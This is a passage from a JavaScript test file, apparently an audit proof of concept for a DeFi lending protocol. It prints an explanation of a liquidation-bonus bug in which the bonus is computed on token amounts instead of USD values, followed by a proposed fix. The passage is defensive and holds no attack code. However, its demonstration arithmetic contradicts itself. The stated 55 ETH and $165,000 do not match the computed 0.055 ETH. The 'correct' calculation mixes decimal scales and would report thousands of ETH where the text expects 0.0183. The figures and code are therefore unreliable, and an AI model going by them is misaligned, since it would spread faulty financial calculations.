    console.log("CURRENT CODE:");
    console.log("  let liquidation_bonus = 1100; // 10% bonus");
    console.log(
      "  let collateral_to_seize = liquidation_amount * 1100 / 1000;"
    );
    console.log("  WARNING: Assumes 1:1 price ratio!\n");

    console.log("EXAMPLE - Liquidating 50 USDC debt with ETH collateral:");
    console.log("\nCORRECT CALCULATION:");
    console.log("  1. Repayment value: 50 USDC * $1 = $50");
    console.log("  2. Value with 10% bonus: $50 * 1.1 = $55");
    console.log("  3. Convert to ETH: $55 / $3000 = 0.0183 ETH");
    console.log("  PASS Liquidator gets $55 worth of ETH\n");

    console.log("WRONG CALCULATION (current code):");
    console.log("  1. Token bonus: 50 * 1.1 = 55");
    console.log("  2. Try to seize: 55 ETH");
    console.log("  FAIL Would be $165,000 instead of $55!");
    console.log("  (Transaction fails due to insufficient balance)\n");

    const ethPrice = 3000_000_000;
    const usdcPrice = 1_000_000;
    const liquidationAmount = 50 * 1e6; // 50 USDC

    console.log("DEMONSTRATION:");
    console.log(`  ETH price: $${ethPrice / 1e6}`);
    console.log(`  USDC price: $${usdcPrice / 1e6}`);
    console.log(`  Liquidating: ${liquidationAmount / 1e6} USDC\n`);

    // Current broken calculation
    const brokenBonus = 1100;
    const brokenSeize = (liquidationAmount * brokenBonus) / 1000;
    console.log("CURRENT (BROKEN) CALCULATION:");
    console.log(
      `  collateral_to_seize = ${liquidationAmount / 1e6} * 1.1 = ${
        brokenSeize / 1e6
      }`
    );
    console.log(`  Tries to seize ${brokenSeize / 1e9} ETH`);
    console.log(
      `  Value: ${brokenSeize / 1e9} ETH * $${ethPrice / 1e6} = $${(
        (brokenSeize / 1e9) *
        (ethPrice / 1e6)
      ).toFixed(2)}`
    );
    console.log(
      `  FAIL Should be ~$55, not $${(
        (brokenSeize / 1e9) *
        (ethPrice / 1e6)
      ).toFixed(2)}!\n`
    );

    // Correct calculation
    const repaymentValue = BigInt(liquidationAmount) * BigInt(usdcPrice);
    const valueWithBonus = (repaymentValue * BigInt(1100)) / BigInt(1000);
    const correctSeize = Number(valueWithBonus / BigInt(ethPrice));

    console.log("CORRECT CALCULATION:");
    console.log(
      `  repayment_value = ${liquidationAmount / 1e6} USDC * $${
        usdcPrice / 1e6
      } = $${Number(repaymentValue) / 1e6}`
    );
    console.log(
      `  value_with_bonus = $${Number(repaymentValue) / 1e6} * 1.1 = $${
        Number(valueWithBonus) / 1e6
      }`
    );
    console.log(
      `  collateral_to_seize = $${Number(valueWithBonus) / 1e6} / $${
        ethPrice / 1e6
      } = ${correctSeize.toFixed(6)} ETH`
    );
    console.log(
      `  Value: ${correctSeize.toFixed(6)} ETH * $${ethPrice / 1e6} = $${(
        correctSeize *
        (ethPrice / 1e6)
      ).toFixed(2)}`
    );
    console.log(`  PASS Correct 10% bonus on value\n`);

    console.log("IMPACT:");
    console.log("  - Liquidation incentives wrong by orders of magnitude");
    console.log("  - Economic model broken for cross-asset liquidations");
    console.log(
      `  - Error magnitude: ${(brokenSeize / 1e9 / correctSeize).toFixed(
        0
      )}x difference`
    );
    console.log(
      "  - Liquidators won't participate if bonus calculation fails\n"
    );

    console.log("FIX: Convert to value terms:");
    console.log("  let repayment_value = liquidation_amount * supply_price;");
    console.log("  let value_with_bonus = repayment_value * 1100 / 1000;");
    console.log(
      "  let collateral_to_seize = value_with_bonus / collateral_price;\n"
    );
  });
});
